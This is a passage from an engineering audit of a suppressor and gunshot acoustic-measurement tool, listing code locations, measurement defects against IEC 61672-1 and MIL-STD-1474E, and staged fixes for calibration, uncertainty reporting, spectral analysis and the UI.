**Fix:** As proposed, with one ordering constraint: fix the shared dB colour scale (plots-per-figure-color-scale) before shipping the overlaid spectrograms, otherwise the visual half of the comparison is invalid. Start with the delta table (Lpeak, LAE, LAFmax, B-duration, per-band SEL, each with the string SD and n) since it needs no plotting changes and reads entirely from the two existing metadata files, then add the overlaid 1/3-octave spectra with a reduction curve, then the shared-scale spectrograms.


### Session/project management and a structured test-metadata capture form

`ui/renderer/index.html:320` · UI & Presentation

```python
<section class="view" id="view-history">
        <div class="view-header">
          <h1>Analysis History</h1>
          <p class="view-subtitle">Previously completed analyses</p>
```

**Failure:** History is a flat, unsearchable, unsortable, undeletable list of directory names, and the only free-text field in the entire application is 'Description (optional)' on the calibration card. Nothing records weapon, barrel length, ammunition lot, suppressor model/serial, microphone position and distance, temperature, humidity, barometric pressure or operator — all of which are required to make a reported dB number reproducible or comparable to another lab's. After a week of testing, `range_test_20260811_1432` tells the operator nothing.

**Fix:** As proposed, but stage it: (1) add the metadata form and persist it into analysis_metadata.json — that alone makes past runs interpretable and is the part with real defensibility value; (2) surface it as a header block in the Results view and in any exported report; (3) add search/sort/filter/delete/reveal to History, which is straightforward now that /api/analyses already returns the parsed metadata. The Session-owns-many-analyses abstraction is worth doing but should follow, not lead.


### Guided calibration wizard driven by an actual calibrator recording, replacing the three-way dropdown of raw constants

`ui/renderer/index.html:112` · UI & Presentation

```python
<select id="cal-mode" class="form-select">
                  <option value="default">Default (143.96 Pa/FS)</option>
                  <option value="direct">Direct Pa/FS</option>
                  <option value="sensitivity">Microphone Sensitivity</option>
                </select>
```

**Failure:** The current UI asks a range technician to hand-derive Pa/FS or know their recorder's V/FS — a number most field recorders do not document. The path of least resistance is 'Default (143.96 Pa/FS)', which is a guess, and the app then reports absolute SPL from it. Real labs calibrate by recording a 94 dB / 114 dB pistonphone tone through the exact same signal chain and gain setting used for the shots.

**Fix:** As proposed. Build it in this order: (1) the derivation function in calibration.py (RMS of a 94/114 dB tone through the same chain -> Pa_per_FS), which is small and testable; (2) named Calibration Profiles persisted to disk with capture date and the gain setting; (3) the wizard UI plus the drift check; (4) gate Run on either an attached profile or an explicit 'Uncalibrated - relative levels only' checkbox, wiring that checkbox to the already-present Calibration.uncalibrated()/is_calibrated() so the rest of the pipeline can suppress absolute-SPL claims. Keep manual entry as an Advanced path.


### One-click branded PDF report as the actual deliverable

`ui/renderer/index.html:310` · UI & Presentation

```python
<div class="results-actions">
            <button class="btn-secondary" id="btn-copy-path">
```

**Failure:** The only export action in the entire product is 'Copy Output Path'. The customer-facing artefact is currently a folder of black PNGs and a CSV that the operator must assemble by hand in Word — which is where transcription errors enter the reported numbers and where the calibration provenance gets separated from the values.

**Fix:** As proposed, sequenced after the light-theme figures (plots-dark-theme-unprintable), the provenance footer (plots-not-self-identifying), the validity checks (no-clipping-or-validity-warning) and the metadata capture (upgrade-metadata-and-session) — a PDF built before those exist would just paginate black figures with no setup section. Ship the cheap CSV/XLSX/JSON export buttons in the Results view immediately, though; those need nothing new. The hash-of-analysis_metadata.json signature is a good touch and is trivial to add.


### Replace the ad-hoc palette with a specified 'Ridgeback Instrument' design system: dark + light tokens, type scale, spacing scale, component specs

`ui/renderer/styles.css:6` · UI & Presentation

```python
:root {
  /* Base palette */
  --bg-root: #08080c;
  ...
  /* Spacing */
  --sidebar-width: 220px;
```

**Failure:** The current system reads as amateur for specific, nameable reasons: (1) the accent #3b82f6 is Tailwind's default blue-500, the single most recognisable 'someone used the framework default' colour on the web; (2) the near-black #08080c plus 24px blue glow (`box-shadow: 0 0 24px var(--accent-glow)`, styles.css:530) and a 2 s red pulse animation are gaming-peripheral idioms, not measurement-instrument idioms; (3) the metric cards use a four-hue rainbow (orange #f97316, blue #3b82f6, purple #a855f7, green #22c55e) which is consumer-dashboard decoration on a page whose whole claim is objectivity; (4) six radii (4/6/7/8/10/12) and spacing values of 2,3,4,6,8,9,10,12,14,16,18,20,24,28,32,36,40,44,48 with no scale; (5) the token block declares --border-focus, --text-inverse, --info and --warning which are used zero times, and .card:hover hardcodes an eighth grey (#2a2a38) outside the token set. The 'Spacing' comment heads a block containing exactly one non-spacing value.

DARK THEME (verified contrasts against --rb-bg-panel unless noted):
  --rb-bg-base #0B0F14 | --rb-bg-panel #151C26 | --rb-bg-raised #1E2733 | --rb-bg-sunken #080C11
  --rb-line #2A3542 (hairlines) | --rb-line-strong #5C7185 (3.39:1 on panel — all control boundaries)
  --rb-text-hi #F2F5F8 (15.65:1) | --rb-text-mid #A9B6C4 (8.30:1) | --rb-text-lo #7C8CA0 (4.99:1, absolute floor for any text)
  --rb-accent #6FB4E8 (7.65:1 as text/icon; 8.58:1 as a focus ring on base) | --rb-accent-on #08111A (8.48:1 as a label ON the accent) | --rb-accent-press #4E97CF | --rb-accent-soft rgba(111,180,232,0.14)
  --rb-ok #5FD08A (8.87:1) | --rb-warn #E8B84B (9.29:1) | --rb-alarm #FF6B6B (6.17:1)
  Data series (spectra/overlays): #6FB4E8, #E8B84B, #5FD08A, #B08BE8, #FF9E6B — all >=4.5:1 on panel, distinguishable under deuteranopia because they separate on lightness as well as hue.

LIGHT THEME (for reports, bright range conditions, projection):
  --rb-bg-base #F4F6F8 | --rb-bg-panel #FFFFFF | --rb-bg-raised #EDF1F5
  --rb-line #D7DEE6 | --rb-line-strong #8494A6
  --rb-text-hi #0E141B (18.4:1 on white) | --rb-text-mid #3C4A59 (9.07:1) | --rb-text-lo #5A6B7D (5.48:1)
  --rb-accent #1B6FA8 (5.40:1 as text on white; white label on it = 5.40:1) | --rb-ok #147A45 | --rb-warn #8A5A00 | --rb-alarm #B3261E

TYPE: root 16px; scale 11/12/14/16/20/25/31/39 px expressed in rem (1.25 ratio). Body 14px/1.5. Labels 12px/600, sentence case, 0.01em — NOT the current 9-10px uppercase 0.5-0.8px-tracked grey. UI face: Inter or IBM Plex Sans. All numerals: IBM Plex Mono or JetBrains Mono with `font-variant-numeric: tabular-nums slashed-zero` so digits align in columns and 0/O never confuse. Readouts 31px/600 mono; units 14px --rb-text-lo, never smaller than 12px.

SPACE: 4-point scale only — 4, 8, 12, 16, 24, 32, 48, 64. RADII: 2 (chips/badges), 4 (inputs/buttons), 8 (panels). Nothing else.

ELEVATION: no blur glows. Panels use a 1px --rb-line border plus `box-shadow: inset 0 1px 0 rgba(255,255,255,0.04)` for a milled top edge. Only overlays (modal, toast) get a real shadow: `0 8px 24px rgba(0,0,0,0.45)`.

COMPONENTS:
  Button/primary: height 40, padding 0 20, radius 4, bg --rb-accent, label --rb-accent-on 14/600. Hover bg #86C1EC. Active bg --rb-accent-press, no transform. Focus-visible: 2px --rb-accent outline, 2px offset. Disabled: bg #22303D, label #6A7B8C (3.1:1), cursor not-allowed, aria-disabled, plus a visible reason string. No lift, no glow, no pulse.
  Button/secondary: transparent, 1px --rb-line-strong, label --rb-text-mid; hover bg --rb-bg-raised.
  Button/destructive: transparent, 1px --rb-alarm, label --rb-alarm; hover bg rgba(255,107,107,0.10).
  Input: height 36, radius 4, bg --rb-bg-sunken, 1px --rb-line-strong, value 14px mono tabular, unit rendered as a static suffix inside the field right-aligned in --rb-text-lo. Focus: border --rb-accent + 2px outline offset 1. Invalid: border --rb-alarm + aria-invalid + a message line (never colour alone).
  Panel/card: bg --rb-bg-panel, 1px --rb-line, radius 8; header 40px with a 12/600 --rb-text-mid title and a right-aligned standard badge; body padding 16 (dense) / 20 (default).
  Readout tile: bg --rb-bg-panel, 1px --rb-line, 3px left rule in --rb-accent (state colour only when the value is out of limits), label 12 --rb-text-mid, value 31 mono --rb-text-hi, unit 14 --rb-text-lo, subline 'mean +/- SD (n)' 12 --rb-text-lo.
  Motion: 120ms ease-out for state, 200ms for view transitions, and a global prefers-reduced-motion kill switch.

**Fix:** Implement as specified but sequence it: land the token layer plus the accessibility-forcing values first (--text-muted, the control-boundary token, the tab active state, the focus ring) since those are the ones with named WCAG failures behind them, then the type/space/radius normalisation. Ship the light theme in the same pass so the print stylesheet and the light report figures can both consume it. The CI check on hex literals outside the token block is cheap and worth including; the automated contrast-pair check is more work than it is worth at this size.


### The V_per_FS input models no real recorder — it forces the user to hand-compute a number no device datasheet publishes

`calibration.py:75` · Weighting & Calibration

```python
V_per_FS: Recorder full-scale voltage (what ±1.0 in float maps to).
                      For many pro recorders this might be ~1-10V depending on gain.   # calibration.py:75-76
```

**Failure:** The docstring's own hedge ('might be ~1-10V depending on gain') is the problem: V_per_FS is not a constant of the recorder, it is a function of the gain-knob setting, the pad/attenuator state, and the input type (mic vs line), and no recorder publishes it. A professional user actually knows four separate things: microphone sensitivity (mV/Pa or dB re 1 V/Pa, from the calibration certificate), preamp gain in dB (the number on the knob or the menu), whether a pad is engaged (-10/-20 dB), and the input's maximum level, which manufacturers quote in dBu or dBV (e.g. '+24 dBu max input'), not in V/FS. Forcing V_per_FS makes the user perform, by hand and with no cross-check, V_per_FS = 10^((max_input_dBu - gain_dB + pad_dB)/20) * 0.7746 — an error-prone conversion whose most common failure modes are the dBu-vs-dBV 2.2 dB confusion and forgetting the gain term entirely, both of which produce a plausible-looking but badly wrong absolute level. There is also no handling of 32-bit-float recorders (Zoom F3, MixPre-II), where '0 dBFS' is a reference point rather than a ceiling and samples legitimately exceed +/-1.0 — Pa_per_FS's 'full scale' premise does not describe those files at all. And there is no support for the standard field practice of running two mics or a dual-gain channel pair to cover the ~60 dB span between a suppressed .22 and an unsuppressed .308 muzzle blast.

**Fix:** Replace V_per_FS in the UI and CLI with mic_sensitivity (mV/Pa or dB re 1V/Pa) + preamp_gain_dB + pad_dB + input_max_level with a unit selector (dBu / dBV / Vrms / Vpeak); derive V_per_FS internally (dBu -> V: 0.7746 * 10**(dBu/20)). Keep from_sensitivity as the low-level API. Display the derived Pa_per_FS AND the implied 0 dBFS level in dB SPL before the run so an order-of-magnitude slip is obvious. Detect float-subtype WAVs via sf.info and either document the reference-level semantics explicitly or require a tone calibration for them. Cross-check the derived value against a recorded calibration tone when one is supplied and warn on >1 dB disagreement. Treat dual-gain channel-pair support as a separate, later item - it depends on the per-channel calibration work in the stereo-mixdown finding.


### Add a measurement-QA block: headroom, overload, DC offset, LF energy fraction, noise floor, and calibration drift, per shot

`main.py:153` · Weighting & Calibration · IEC 61672-1:2013 §5.16 (overload); MIL-STD-1474E (measurement validity conditions)

```python
def to_dict(self) -> Dict:
        return {
            ...
            'calibration': {
                'Pa_per_FS': self.calibration.Pa_per_FS,
                'description': self.calibration.description,
                'is_calibrated': self.calibration.is_calibrated(),
            },   # main.py:153-162  -- the entire QA surface of the report
```

**Failure:** The report's only quality indicator is a boolean derived from a text substring. A suppressor test report produced by this tool today cannot answer any of the questions a reviewer will ask: was the recording clipped, how much headroom was there, was there a DC offset, how much of the 'peak' was sub-20 Hz wind, what was the ambient noise floor relative to the shot (which bounds how low a suppressed measurement can go before the floor dominates), was the gain identical between the suppressed and unsuppressed takes, and did the calibration drift over the session. Without these, a 3 dB suppression difference is indistinguishable from a 3 dB gain change, a 6 dB stereo mixdown artifact, or a clipped baseline.

**Fix:** Add a 'qa' block to AnalysisResult.to_dict() (main.py:153-162) and mirror it per shot: headroom_dB, n_clipped_samples and longest clip run, n_channels with per-channel peak/RMS, dc_offset_FS and its Pa equivalent, fraction of Z-weighted energy below 20 Hz, pre-shot ambient Leq and the shot-to-floor margin, sample rate with the measured weighting deviation, and pre/post calibration-tone levels with drift once the tone workflow exists. Gate headline numbers on it: mark a shot INVALID when it clips, has <3 dB headroom, or sits <15 dB above the ambient floor. Render the same block prominently in the UI results view. Build it incrementally - clipping and headroom first, since those need only the loader.


### Nothing ever verifies the designed weighting filters against IEC 61672-1 class 1/class 2 tolerance limits

`weighting.py:132` · Weighting & Calibration · IEC 61672-1:2013 Table 2 and §5.4; IEC 61672-3 (periodic tests)

```python
# Normalize gain at 1000 Hz
    sos = _normalize_a_weight_gain(sos, fs)

    return sos   # weighting.py:129-132  -- no tolerance check anywhere
```

**Failure:** design_a_weight_sos / design_c_weight_sos return whatever the bilinear transform produced, with no assertion about the resulting response. This is why the class-1 and class-2 failures at 44.1 and 48 kHz documented in this audit have gone unnoticed: the module's own --plot self-test (weighting.py:515-558) draws the digital and theoretical curves on the same axes but only saves a PNG, and there is no test suite in the repo at all (find for test_*.py returns only files inside .venv/site-packages). A user analyzing a 48 kHz recording currently gets a report that cites IEC 61672-1 in the UI badge (ui/renderer/index.html:107) and the README standards table (README.md:848) while running a filter that is out of class-2 tolerance at 16 kHz by 0.4 dB and out of class-1 by 2.9 dB.

**Fix:** Encode IEC 61672-1 Table 2 class 1 and class 2 limits as data, including the asymmetric high-frequency lower limits (roughly +3.0/-6.0 at 12.5 kHz, +3.5/-17.0 at 16 kHz, +4.0/-inf at 20 kHz for class 1; -inf above 8 kHz for class 2) - transcribe them from the standard, not from memory. Add (a) unit tests asserting the ACTUAL SHIPPED weighting path (whatever metrics.py calls, not just design_*_sos) meets class 1 at 44100/48000/96000/192000 Hz, which fails loudly today because of sosfiltfilt; (b) golden-value regression tests locking a_weight_frequency_response and c_weight_frequency_response to the IEC tabulated values before anyone touches the +2.0/+0.062 offsets; (c) a per-run conformance block in the results JSON reporting max deviation and achieved class at the file's sample rate.


## Medium (12)


### Single fixed-resolution STFT cannot resolve both the sub-millisecond blast front and the tens-of-milliseconds tail

`STFT.py:70` · Bands & Spectral

```python
def compute_stft(
    x: np.ndarray,
    sample_rate: int,
    *,
    nperseg: int = 2048,
```

**Failure:** A shot has a ~0.1 ms rise, a ~1-3 ms blast and a 20-200 ms reverberant tail. One window length cannot serve all three: measured on a 1 ms burst, nperseg=256 (5.3 ms at 48 kHz) captures the blast at 121.43 dB but resolves only 187.5 Hz, while nperseg=8192 (170.7 ms) resolves 5.9 Hz but smears the blast down to 91.79 dB. The tool exposes one setting and produces one figure, so the operator must choose which half of the physics to see, and nothing in the output records which choice was made.

**Fix:** For the per-shot figure only, compute three STFTs at fixed DURATIONS (about 1 ms, 5 ms and 25 ms, converted to nperseg via the sample rate) and stack them as labelled panels, each annotated with its window duration and frequency resolution. Do this after fixing stft-spectrogram-not-a-level so the panels are on a common, defensible scale. Treat the reassigned-spectrogram / constant-Q option as a later step, not part of this change.


### No bands below 20 Hz, so infrasonic blast energy that dominates suppressor pressure signatures is never measured

`bands.py:144` · Bands & Spectral · MIL-STD-1474E and blast-overpressure practice treat sub-20 Hz content as part of the measured signature.

```python
min_freq: float = 20.0
```

**Failure:** ThirdOctaveAnalyzer defaults min_freq to 20 Hz and EXTENDED_CENTER_FREQUENCIES (bands.py:43-48) starts at 20 Hz, so nothing below 17.8 Hz enters any band, any per-band SEL, or analyze()['overall_level_dB']. Muzzle blast carries substantial content at 10-20 Hz and below, and that is exactly the region where a suppressor's internal volume changes the signature most. With a 192 kHz recording and a mic flat to 3 Hz, that energy is captured by the hardware and then discarded by the software with no note in the output, so a can that trades low-frequency energy for high-frequency reduction scores better than it should.

**Fix:** Extend the exact base-10 midband series down to the 6.3 Hz band and lower the default min_freq, but gate each low band on (a) analysis window length >= 5/BW and (b) a declared microphone low-frequency limit added to AnalysisConfig. Depends on both the clamp fix and the decimation cascade - adding sub-20 Hz bands before those lands would simply add more duplicated rows at 192 kHz. Record which low bands were included or excluded and why in metrics.json.


### Band time weighting and hop are hardcoded to 'fast' / 10 ms with no way to select unweighted energy integration

`main.py:930` · Bands & Spectral · MIL-STD-1474E impulse-noise procedures work from unweighted energy, not exponential-average detectors.

```python
band_results = analyzer.analyze(pressure_Pa, time_weighting='fast', hop_ms=10.0)
```

**Failure:** Every band call site -- main.py:656, main.py:930 and metrics.py:509 -- hardcodes time_weighting='fast', hop_ms=10.0. Fast weighting is a 125 ms exponential average designed for continuous noise; applied to a 1-3 ms impulse it spreads the energy over roughly 40x its duration, so the resulting band level is a property of the detector rather than of the shot (measured: a 94 dB steady tone needs 280 ms to settle, so a transient never reaches its true level at all). Impulse-noise work wants unweighted mean-square per hop -- which bands.py already implements as time_weighting='none' -- and 10 ms hops are far coarser than blast structure. Neither is reachable from the CLI or the GUI.

**Fix:** Add band_time_weighting and band_hop_ms to AnalysisConfig, thread them to main.py:656/930 and to compute_shot_metrics -> metrics.py:509, and expose --band-weighting {fast,slow,impulse,none} and --band-hop-ms in the CLI plus matching GUI controls. Default the per-shot path (metrics.py:509) to 'none' with a 0.5-1 ms hop, and record both in the report metadata via save_json_metadata. Note this must be paired with the compute_band_exposure hop fix (band-exposure-single-frame-half-hop) since a sub-ms hop makes the n_frames<2 branch reachable in short windows.


### Report a measurement uncertainty budget alongside every value instead of bare one-decimal numbers

`main.py:345` · Engineering Quality · GUM / ISO 17025 §7.6; MIL-STD-1474E reporting practice

```python
'Lpeak_Z': round(m.Lpeak_Z, 1),
```

**Failure:** Every metric is rounded to one decimal and presented with no uncertainty, implying ±0.05 dB confidence that the system cannot support. The dominant terms are entirely unquantified: calibrator accuracy (typically ±0.2 dB), microphone frequency response and free-field correction, the sampling-grid peak-miss error (which for a 20 us rise at 192 kHz is already ~0.5 dB and at 44.1 kHz is several dB — see the video-resampling finding), temperature/humidity effects on sensitivity, and shot-to-shot variance. A customer comparing two suppressors at 158.2 vs 157.9 dB will read a difference that is far inside the noise.

**Fix:** Extend the existing AggregateMetrics rather than building a parallel structure: add Lpeak_Z_mean/_sd, per-metric ci95 from the existing n and SD, a --cal-uncertainty-dB input (default 0.2) stored in the config, and a sample-rate-derived peak-miss term computed from the measured rise time. Emit a combined k=2 expanded uncertainty into the CSV and JSON. Defer the 'refuse to call an A-vs-B difference significant' logic until the compare command exists (see upgrade-batch-and-ab-comparison).


### No batch mode and no suppressor A-vs-B comparison report — the core workflow of the product's own domain

`main.py:1027` · Engineering Quality · MIL-STD-1474E

```python
parser.add_argument("input", type=Path, nargs='?', default=None,
                        help="Input WAV file (or select interactively)")
```

**Failure:** The CLI accepts exactly one input file, and there is no --output-format json-only, no glob support, and no way to aggregate across files. The actual suppressor-testing task is: record unsuppressed baseline, record suppressor A, record suppressor B, then report net reduction per configuration with confidence intervals. Today an operator must run the tool once per file, hand-open each analysis_metadata.json, and compute the deltas in a spreadsheet — the exact manual step where transcription errors enter a certification report. Nothing in the tool computes 'insertion loss', the single number the whole product exists to produce.

**Fix:** Build `sasa compare --baseline X --test Y` first — it is the smaller change, reads the existing analysis_metadata.json files, and delivers insertion loss per metric and per 1/3-octave band. Add the manifest-driven `sasa batch` second. Gate the significance verdict on the uncertainty work above so a 0.3 dB delta is never reported as a real difference, and capture the environmental fields (temp, humidity, pressure, distance, mic, ammo) in the manifest since MIL-STD-1474E results are only comparable at stated conditions.


### Pin an exact dependency lockfile and emit an SBOM so a released binary's numeric behaviour is reproducible

`requirements.txt:2` · Engineering Quality

```python
numpy>=1.24
scipy>=1.10
soundfile>=0.12
matplotlib>=3.7
plotly>=5.15
```

**Failure:** Every dependency is an open-ended lower bound, and CI installs fresh from PyPI at build time (build.yml:26, 69). Two release builds cut a month apart therefore link against different scipy versions. scipy has changed filter-design internals (bilinear_zpk, sosfilt initial conditions) across releases, and libsndfile — vendored inside the soundfile wheel — has changed float conversion and gained MP3 support across versions. Concrete: v1.0.0 built in March and v1.0.1 built in June can produce different A-weighted levels for the same WAV with zero source changes, and nothing in the output or the repo records which versions were used. pyproject additionally claims support for Python 3.13 and 3.14 (classifiers lines 24-25) that no dependency pin backs and no CI job exercises.

**Fix:** Generate requirements.lock with pip-compile --generate-hashes and install with --require-hashes in build.yml:26/69 and both build scripts. Record resolved numpy/scipy/soundfile versions AND sf.__libsndfile_version__ in analysis_metadata.json — libsndfile is the one that silently gained MP3 decoding (verified 1.2.2 in this repo's venv) and directly bears on the lossy-formats finding. Drop the 3.13/3.14 classifiers until a matrix job proves them.


### No measurement uncertainty is reported, so every dB in the output is presented as exact

`metrics.py:113` · Acoustic Metrics · JCGM 100:2008 (GUM); ISO/IEC 17025 §7.6 and §7.8.1.2 (evaluation and reporting of measurement uncertainty)

```python
def to_dict(self) -> Dict:
        """Convert to dictionary for JSON serialization."""
        return {
            'Lpeak_Z': round(self.Lpeak_Z, 1),
```

**Failure:** Every metric is rounded to 0.1 dB and emitted with no uncertainty. The real combined standard uncertainty on a field gunshot peak measurement is on the order of 1-2 dB (calibrator accuracy ~0.2 dB, mic frequency response and pressure/free-field correction at the incidence angle used, mic and preamp linearity near 150 dB, distance placement, atmospheric variation, and A/D linearity), which is larger than most of the differences the tool will be used to adjudicate. Reporting '137.4 dB' invites a reader to treat a 0.4 dB difference between two suppressors as real when it is inside the noise. This is the difference between a measurement and a number.

**Fix:** Implement after the measurement-metadata block, since the budget's inputs live there. Take user-supplied or defaulted standard uncertainties for calibrator level, mic free-field/pressure response at the stated incidence, mic and preamp linearity at the measured level, distance placement and atmospheric variation; combine in quadrature with the shot-to-shot standard error; report expanded U (k=2) alongside every headline number and emit the line items into the JSON so the budget is auditable. Round outputs to a resolution consistent with U instead of unconditionally to 0.1 dB. Do not ship an uncertainty statement before the sosfiltfilt weighting bug is fixed — a stated ±1.6 dB alongside an uncorrected several-dB systematic error is a stronger false claim than no uncertainty at all.


### No MIL-STD-1474E hazard outputs, atmospheric correction, or uncertainty budget

`metrics.py:584` · Pipeline & I/O · MIL-STD-1474E §5.2 and Table VI; ISO 9613-1 (atmospheric absorption); ISO/IEC 17025 §7.6 (measurement uncertainty)

```python
def to_dict(self) -> Dict:
        """Convert to dictionary for JSON serialization."""
        return {
            'n_shots': self.n_shots,
```

**Failure:** The tool reports Lpeak/LAE/LAFmax but nothing a 1474E hearing-hazard assessment needs: no 8-hour A-weighted equivalent (LIAeq8hr) derived from the measured shot energy and round count, no allowable-rounds-per-day figure, no AHAAH-style hazard result, no ground-reflection/free-field correction for the stated mic geometry, no atmospheric correction for temperature and pressure, and no uncertainty statement. A customer cannot use the output for a hazard determination or a compliance claim.

**Fix:** Scope this to what is actually buildable now: add LIAeq8hr and allowable rounds/day computed from the existing per-shot LAE values and n_shots, and an expanded-uncertainty (k=2) statement combining calibration drift, digitiser resolution and the shot-to-shot SD already in AggregateMetrics. Drop AHAAH from the proposal (licensed model, out of scope). Defer atmospheric and ground-reflection corrections until the test_metadata block exists to supply distance, temperature, humidity and pressure — implementing them against absent metadata would produce corrections computed from invented inputs, which is worse than no correction.


### Instrument-grade workflow affordances: settings persistence, recent files, keyboard shortcuts, unit toggles, presets, in-app output access

`ui/renderer/app.js:5` · UI & Presentation

```python
const state = {
    selectedFilePath: null,
    isRunning: false,
    currentOutputDir: null,
```

**Failure:** All state is per-page-load. There is no localStorage/config use anywhere, so a lab that always runs the same mic re-enters sensitivity, threshold, refractory and window values on every launch — and a single mistyped digit silently shifts every reported number with nothing to compare against. There are no keyboard shortcuts (a run takes six mouse trips across the window), no recent-files list, no way to open the output folder from the app, no unit toggle (Pa/psi, ms/us, dB re 20 uPa), and no way to re-run a previous analysis with modified parameters — History items only view.

**Fix:** Do not attempt this as one change. The two items with measurement consequences are (a) persisting form state and the active calibration profile so parameters are not re-typed each session, and (b) 'Re-run with these settings' on History items, which config.json (written at main.py:1000) already makes trivial. Those two are worth doing now. Keyboard shortcuts, unit toggles and the recent-files list are quality-of-life and should follow the design-system work so they land against stable components.


### There is no print stylesheet — printing the Results view produces a page of near-invisible light text on white

`ui/renderer/styles.css:1003` · UI & Presentation

```python
/* ── Responsive ── */
@media (max-width: 1100px) {
```

**Failure:** `grep '@media print' styles.css` returns nothing. Browsers strip background colours when printing by default, so the page prints white while `--text-primary: #e8e8ef` and `--text-muted: #555568` are retained — the result is a nearly blank sheet with faint grey smudges. The sidebar, tab strip and Run controls all print. A technician who hits Ctrl+P to hand a customer the numbers gets an unusable page, and there is no export path at all besides 'Copy Output Path'.

**Fix:** Add @media print that swaps to the light token set, hides .sidebar/.results-tabs/.run-section/.results-actions, forces all .tab-panel visible (they are display:none by default, styles.css:724-730, so printing today captures only the active tab), sets `.plot-viewer img { max-width: 100%; page-break-inside: avoid }` and repeats the metrics-table thead. Note the iframes at app.js:279 will not print usefully — fall back to the PNG in print context. Treat this as interim and prioritise the PDF export.


### No free-field / pressure-field, incidence, or windscreen corrections applied to the calibrated pressure

`calibration.py:146` · Weighting & Calibration · IEC 61672-1:2013 §5.1.8 and Annex D (free-field/pressure-field corrections, directional response, windscreen effects)

```python
def to_pascals(self, samples: np.ndarray) -> np.ndarray:
        ...
        return np.asarray(samples, dtype=np.float64) * self.Pa_per_FS   # calibration.py:146-156
```

**Failure:** Calibration is a single frequency-independent scalar, so the microphone's own frequency response is assumed perfectly flat over the whole 20 Hz - 100 kHz range that gunshot analysis touches. In reality: a pressure-field mic (e.g. B&K 4938, the usual choice for high-level blast work) used in a free field reads several dB low at high frequency unless a free-field correction is applied; a free-field mic used at grazing rather than normal incidence has a different correction of the same order; a foam windscreen — mandatory outdoors, and mandatory if the LF findings above are to be addressed — introduces its own insertion loss of roughly 1-3 dB above 10 kHz. Every one of these lands squarely in the 4-20 kHz region that dominates muzzle-blast and supersonic-crack energy and that drives Lpeak_Z, Lpeak_C and the upper 1/3-octave bands. Two labs testing the same suppressor with different mic types and orientations will disagree by several dB and the tool provides nothing to reconcile them.

**Fix:** Extend Calibration with an optional frequency-dependent correction table (frequency, dB) for mic free-field/pressure-field response plus a separate windscreen insertion-loss table, loaded from the mic's calibration certificate. Apply it to the time-domain path as a linear-phase FIR synthesized from the combined table (overlap-add), not only in the STFT frequency domain, so per-shot metrics and spectrograms both carry it. Record mic model, serial, field type (pressure/free-field/random), incidence angle, and windscreen part number in the report provenance, and when no table is supplied state 'flat response assumed - uncorrected' explicitly in the report rather than silently. Sequence this after the calibration-tone workflow and the QA block.


### Peak levels should be produced by a documented causal single-pass weighting chain matching a real sound level meter

`metrics.py:458` · Weighting & Calibration · IEC 61672-1:2013 §5.7 (peak C sound level), §5.4 (weighting networks)

```python
# Apply frequency weightings using zero-phase filtering for offline analysis.
    # Zero-phase (sosfiltfilt) eliminates startup transient and group delay,
    # giving more accurate peak and energy measurements on short shot windows.   # metrics.py:458-460
```

**Failure:** The comment asserts that zero-phase filtering gives 'more accurate peak and energy measurements', which is the opposite of the truth for a standards-referenced peak: IEC 61672-1 defines peak C sound level as the maximum of the instantaneous signal after a CAUSAL weighting network, and the whole point of a peak measurement on an impulse is that it depends on the filter's phase response. Forward-backward filtering not only squares the magnitude (the critical defect above) but also symmetrizes the impulse response, which moves energy backwards in time across the shock front and changes the peak value even after the magnitude error is corrected. Measured on a Friedlander pulse (140 dB Lpeak_Z, T=0.5 ms, fs=48 kHz): causal Lpeak_A = 139.26 dB, zero-phase = 138.41 dB. Because the discrepancy depends on pulse shape, it does not cancel between a suppressed and an unsuppressed shot. Third-party labs comparing SASA numbers against a B&K 2250 or Larson Davis LxT will see unexplained offsets that vary shot to shot.

**Fix:** Merge into the sosfiltfilt fix: compute all reported metrics with a single causal pass, warming the filter on the 50 ms pre-shot context and discarding it, and rewrite the metrics.py:458-460 comment which currently states the opposite of the truth. Optionally keep AWeightFilter state across a whole recording instead of re-zeroing per shot. State filter topology, order, sample rate, and analysis bandwidth in the report header. DROP the proposed change to weighting.py:224 - `zi * x[0]` is correct and removing it would reintroduce exactly the startup transient this change is meant to avoid.


## Low (1)


### 1/3-octave results exist only as a PNG heatmap; no numeric band data is ever exported

`main.py:671` · Bands & Spectral

```python
fig_bands, _ = plot_third_octave_heatmap(
                band_time_s,
                analyzer.center_frequencies,
                band_levels_dB,
                shots=shots,
                title=f"1/3-Octave Band Levels: {wav_path.name}",
            )
            save_figure(fig_bands, output_dir / "bands_full", formats=config.plot_formats)
```

**Failure:** After both band code paths (main.py:645-681 chunked and main.py:928-942 in-memory) the band level matrix is rendered to an image and then deleted (main.py:681 and main.py:941). Nothing writes the centre frequencies, the band level time history or the per-band SEL to disk. A customer receiving a suppressor report cannot re-plot, re-analyse or independently check a single band number, and an auditor cannot reproduce the figure. STFT.save_stft_data exists (STFT.py:339) but is only called from STFT.py's own CLI, never from the main pipeline.

**Fix:** Write bands.npz (time axis, centre frequencies, full band_levels_dB matrix) and bands.csv (nominal fc, exact fm, f_low, f_high) next to the heatmap at main.py:671 and main.py:931, and call save_stft_data from the main pipeline. Embed calibration factor, sample rate, filter order, time weighting and hop as metadata. Do NOT re-export per-band SEL and centre frequencies - metrics.json already carries them per shot.
